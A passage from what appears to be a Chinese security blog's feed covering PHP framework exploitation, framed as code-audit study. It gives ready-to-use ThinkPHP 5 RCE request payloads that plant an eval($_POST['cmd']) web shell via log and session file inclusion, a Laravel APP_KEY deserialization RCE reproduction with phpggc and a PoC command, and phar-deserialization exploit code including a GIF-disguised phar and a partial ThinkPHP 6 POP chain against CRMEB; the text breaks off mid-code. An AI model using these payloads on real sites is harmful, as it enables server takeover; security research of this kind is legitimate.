punctuation">}</span></code></pre><p>然而parseKey并没有对传入的字符进行任何过滤，所以当输入exp，inc，dec，都返回的字符串，为什么参数值为exp的时候不能产生注入，原因是在用input方法传入的时候，要经过filterExp进行过滤</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">filterExp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 过滤查询特殊字符</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT LIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$value</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// TODO 其他安全过滤</span>    <span class="token punctuation">}</span></code></pre><p>当匹配到exp的时候，就会在exp后面添加一个空格，导致不能同parseKey方法中的exp相等。同样，利用insert方法向数据库插入数据也是同种原理。由于篇幅问题，网上的分析文章也多，之后的注入不想再造轮子了，可以详细看这个师傅的文章：<a href="https://github.com/Mochazz/ThinkPHP-Vuln。" target="_blank" rel="noopener">https://github.com/Mochazz/ThinkPHP-Vuln。</a></p><h4 id="TP5-rce漏洞"><a href="#TP5-rce漏洞" class="headerlink" title="TP5 rce漏洞"></a><strong>TP5 rce漏洞</strong></h4><p>TP5的rce漏洞影响版本：ThinkPHP 5.0.x ~ 5.0.23、ThinkPHP 5.1.x ~ 5.1.31、ThinkPHP 5.2.0beta1</p><p>TP5rce的分析网上也比较多了，我这里有也不造轮子了，主要说下在TP渗透，php7版本的关于log文件和session文件包含的问题。</p><h5 id="runtime文件包含拿shell"><a href="#runtime文件包含拿shell" class="headerlink" title="runtime文件包含拿shell"></a><strong>runtime文件包含拿shell</strong></h5><p>先写入一句话到runtime日志中，POST发送</p><pre><code>_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;server[]=phpinfo&amp;get[]=&lt;?php eval($_POST[&#39;cmd&#39;])?&gt;</code></pre><p>runtime的日志文件为./runtime/log/202008/17.log</p><pre><code>_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]=../runtime/log/202008/17.log&amp;cmd=phpinfo();</code></pre><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/19.png" alt="" loading="lazy"></p><h5 id="session文件包含拿shell"><a href="#session文件包含拿shell" class="headerlink" title="session文件包含拿shell"></a><strong>session文件包含拿shell</strong></h5><p>写入session文件</p><pre><code>_method=__construct&amp;filter[]=think\Session::set&amp;method=get&amp;get[]=&lt;?php eval($_POST[&#39;cmd&#39;])?&gt;&amp;server[]=1</code></pre><p>一般linux下的session文件存储在/var/lib/php/session，session的命名为sess_[PHPSESSID]</p><pre><code>_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;get[]=/var/lib/php/session/sess_sf9vlodcl4j4r1bhli2ddnvr32&amp;server[]=1&amp;cmd=phpinfo();</code></pre><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/20.png" alt="" loading="lazy"></p><p>其实也可以用反序列化的点来，只是有点麻烦，需要去调代码。</p><pre><code>_method=__construct&amp;filter=unserialize&amp;method=get&amp;server[REQUEST_METHOD]=序列化</code></pre><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a><strong>反序列化</strong></h4><p>反序列化点通常都是在代码审计当中被发现的，当unserialize可控时可以触发，但是只光靠unserialize可控很难找到可控点，这时安全研究员<strong>Sam Thomas</strong>分享了一个关于phar反序列的漏洞，大大增加了反序列化的利用点。由于TP5-6的反序列化分析篇幅比较大，可以直接看我博客：</p><p>Thinkphp5.0.24反序列：<a href="https://jfanx1ng.github.io/2020/05/07/ThinkPHP5.0.24反序列化漏洞分析/" target="_blank" rel="noopener">https://jfanx1ng.github.io/2020/05/07/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p><p>Thinkphp5.1.x反序列：<a href="https://jfanx1ng.github.io/2020/05/09/ThinkPHP5.1.x反序列化链分析/" target="_blank" rel="noopener">https://jfanx1ng.github.io/2020/05/09/ThinkPHP5.1.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/</a></p><p>Thinkphp6.x反序列：<a href="https://jfanx1ng.github.io/2020/05/13/ThinkPHP6.0反序列化漏洞分析/" target="_blank" rel="noopener">https://jfanx1ng.github.io/2020/05/13/ThinkPHP6.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p><p>phar反序列化挖掘案列：</p><p><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=57947&amp;page=1" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=57947&amp;page=1</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Runtime日志&quot;&gt;&lt;a href=&quot;#Runtime日志&quot; class=&quot;headerlink&quot; title=&quot;Runtime日志&quot;&gt;&lt;/a&gt;&lt;strong&gt;Runtime日志&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;在ThinkPHP3的版本中，入口文件index.
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Laravel APP_KEY泄露 RCE漏洞分析</title>
    <link href="http://yoursite.com/2020/08/14/LaravelAPP_KEY%E6%B3%84%E9%9C%B2RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/08/14/LaravelAPP_KEY%E6%B3%84%E9%9C%B2RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-08-13T16:00:00.000Z</published>
    <updated>2020-08-14T10:46:06.146Z</updated>
    
    <content type="html"><![CDATA[<p>laravel框架APP_KEY泄露的时候，可以通过cookie和X-XSRF-TOKEN触发反序列化漏洞，影响版本：<strong>5.5.x&lt;=5.5.40、5.6.x&lt;=5.6.29</strong></p><h4 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a><strong>环境安装</strong></h4><pre><code>composer create-project laravel/laravel laravel5629 --prefer-dist &quot;5.6.0&quot;修改composer.json中的5.6.0为5.6.29更新：composer update在routes/web.php新添加一条路由：Route::post(&#39;/&#39;, function() {return view(&#39;welcome&#39;);});</code></pre><h4 id="通过Cookie反序列化"><a href="#通过Cookie反序列化" class="headerlink" title="通过Cookie反序列化"></a><strong>通过Cookie反序列化</strong></h4><p>跟踪代码app\Http\Middleware\EncryptCookies.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">App<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Middleware</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Cookie<span class="token punctuation">\</span>Middleware<span class="token punctuation">\</span>EncryptCookies</span> <span class="token keyword">as</span> Middleware<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">EncryptCookies</span> <span class="token keyword">extends</span> <span class="token class-name">Middleware</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$except</span> <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token comment" spellcheck="true">//</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟踪EncryptCookies的父类，vendor\laravel\framework\src\Illuminate\Cookie\Middleware\EncryptCookies.php，找到handle方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">,</span> Closure <span class="token variable">$next</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token variable">$next</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>继续跟进decrypt方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>Request <span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cookies</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$cookie</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">isDisabled</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cookies</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">decryptCookie</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">DecryptException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cookies</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$request</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这里$request-&gt;cookies进行了遍历，将值传入了decryptCookie方法。继续跟进decryptCookie方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">decryptCookie</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span>        <span class="token operator">?</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">decryptArray</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span>        <span class="token punctuation">:</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">encrypter</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>上面判断我们传入的是否为数组，不为数组进入到decrypt，跟进vendor\laravel\framework\src\Illuminate\Encryption\Encrypter.php的decrypt方法</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/4/1.png" alt="" loading="lazy"></p><p>跟进getJsonPayload方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">getJsonPayload</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">validPayload</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">DecryptException</span><span class="token punctuation">(</span><span class="token string">'The payload is invalid.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">validMac</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">DecryptException</span><span class="token punctuation">(</span><span class="token string">'The MAC is invalid.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$payload</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>我们传入的payload会解密base64，再转化为json，所以这个iv和value是我们可控的，最终就可以来到第149行进行反序列化操作了。</p><h4 id="通过X-XSRF-TOKEN头反序列化"><a href="#通过X-XSRF-TOKEN头反序列化" class="headerlink" title="通过X-XSRF-TOKEN头反序列化"></a><strong>通过X-XSRF-TOKEN头反序列化</strong></h4><p>跟踪代码app\Http\Middleware\VerifyCsrfToken.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">App<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Middleware</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Middleware<span class="token punctuation">\</span>VerifyCsrfToken</span> <span class="token keyword">as</span> Middleware<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">VerifyCsrfToken</span> <span class="token keyword">extends</span> <span class="token class-name">Middleware</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$except</span> <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟踪VerifyCsrfToken的父类，vendor\laravel\framework\src\Illuminate\Foundation\Http\Middleware\VerifyCsrfToken.php，找到handle方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">,</span> Closure <span class="token variable">$next</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">isReading</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span> <span class="token operator">||</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">runningUnitTests</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">inExceptArray</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span> <span class="token operator">||</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">tokensMatch</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addCookieToResponse</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token variable">$next</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TokenMismatchException</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>继续更进tokensMatch方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">tokensMatch</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getTokenFromRequest</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">token</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>        <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>        <span class="token function">hash_equals</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">token</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>继续跟进getTokenFromRequest方法</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/4/2.png" alt="" loading="lazy"></p><p>第140行获取头X-XSRF-TOKEN，又来到熟悉的地方了，更新decrypt方法，跟cookie造成的洞是同一个点。</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h4><p>获取APP_KEY，在根目录.env文件里</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/4/3.png" alt="" loading="lazy"></p><p>用<a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener">phpggc</a>获取laravel的反序列化的exp</p><pre><code>php phpggc Laravel/RCE1 system &quot;ipconfig&quot; -b</code></pre><p>利用kozmic的poc生成laravel rce的利用代码</p><pre><code>php cve-2018-15133.php yyEsCy8SJCpScYkcEBvrRVHv9MDV43MliNS/4ETRJaw= Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjg6ImlwY29uZmlnIjt9</code></pre><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/4/4.png" alt="" loading="lazy"></p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/4/5.png" alt="" loading="lazy"></p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p>1.<a href="https://xz.aliyun.com/t/6533" target="_blank" rel="noopener">https://xz.aliyun.com/t/6533</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;laravel框架APP_KEY泄露的时候，可以通过cookie和X-XSRF-TOKEN触发反序列化漏洞，影响版本：&lt;strong&gt;5.5.x&amp;lt;=5.5.40、5.6.x&amp;lt;=5.6.29&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&quot;环境安装&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>phar反序列化漏洞挖掘</title>
    <link href="http://yoursite.com/2020/07/22/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    <id>http://yoursite.com/2020/07/22/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</id>
    <published>2020-07-21T16:00:00.000Z</published>
    <updated>2020-08-17T09:38:05.541Z</updated>
    
    <content type="html"><![CDATA[<h4 id="phar的结构"><a href="#phar的结构" class="headerlink" title="phar的结构"></a><strong>phar的结构</strong></h4><ol><li>a stub是一个文件标志，格式为 ：<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>。</li><li>manifest是被压缩的文件的属性等放在这里，这部分是以序列化存储的，是主要的攻击点。</li><li>contents是被压缩的内容。</li><li><code>signature</code> 签名，放在文件末尾。</li></ol><h4 id="受影响函数"><a href="#受影响函数" class="headerlink" title="受影响函数"></a><strong>受影响函数</strong></h4><table><thead><tr><th align="center">fileatime</th><th align="center">filectime</th><th align="center">file_exists</th><th align="center">file_get_contents</th></tr></thead><tbody><tr><td align="center">file_put_contents</td><td align="center">file</td><td align="center">filegroup</td><td align="center">fopen</td></tr><tr><td align="center">fileinode</td><td align="center">filemtime</td><td align="center">fileowner</td><td align="center">fileperms</td></tr><tr><td align="center">is_dir</td><td align="center">is_executable</td><td align="center">is_file</td><td align="center">is_link</td></tr><tr><td align="center">is_readable</td><td align="center">is_writeable</td><td align="center">parse_ini_file</td><td align="center">copy</td></tr><tr><td align="center">unlink</td><td align="center">stat</td><td align="center">is_writable</td><td align="center">readfile</td></tr></tbody></table><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象创建调用&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>phar反序列化可以不用unserialize函数的可控，只需要满足上面的危险函数可控，大大增加了反序列化漏洞的挖掘。这里，利用以下代码生成phar文件：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token string">'phpinfo();'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a"</span><span class="token punctuation">.</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义meta-data存入manifest</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span>    <span class="token comment" spellcheck="true">//签名自动计算</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>phar文件是通过stub来标识的，是通过<code>xxx&lt;?php xxx.__HALT_COMPILER(); ?&gt;</code>来判断的，所以对后缀并没有要求，修改成gif，通过图片的上传点，上传到目标服务器，在利用phar://协议执行pahr文件。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/1.png" alt="" loading="lazy"></p><p>在php.ini中需要设置phar.readonly为off，不是无法生成phar文件</p><pre><code>phar.readonly = off</code></pre><h4 id="CRMEB系统phar反序列化"><a href="#CRMEB系统phar反序列化" class="headerlink" title="CRMEB系统phar反序列化"></a><strong>CRMEB系统phar反序列化</strong></h4><p>CRMEB是基于THINKPHP6.0开发的，tp6.0的反序列化链在前面的文章分析过，利用pop链生成php文件。由于是后台反序列化也只能供学习。在crmeb\app\admin\controller\system\SystemFile.php下的openfile方法中的file参数可控。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/2.png" alt="" loading="lazy"></p><p>第66行将file赋值给了filepath变量，然后跟进67的read_file方法</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/3.png" alt="" loading="lazy"></p><p>这里$file可控，且存在执行phar反序列化的危险函数，同时这里也可以任意文件读取</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/4.png" alt="" loading="lazy"></p><p>生成phar文件，执行tp6.0反序列化漏洞，exp如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage</span><span class="token punctuation">{</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">AbstractCache</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$autosave</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$cache</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"shell"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"&lt;?php phpinfo();?>"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage<span class="token punctuation">\</span>AbstractCache</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Adapter</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractCache</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$adapter</span><span class="token punctuation">;</span>        <span class="token 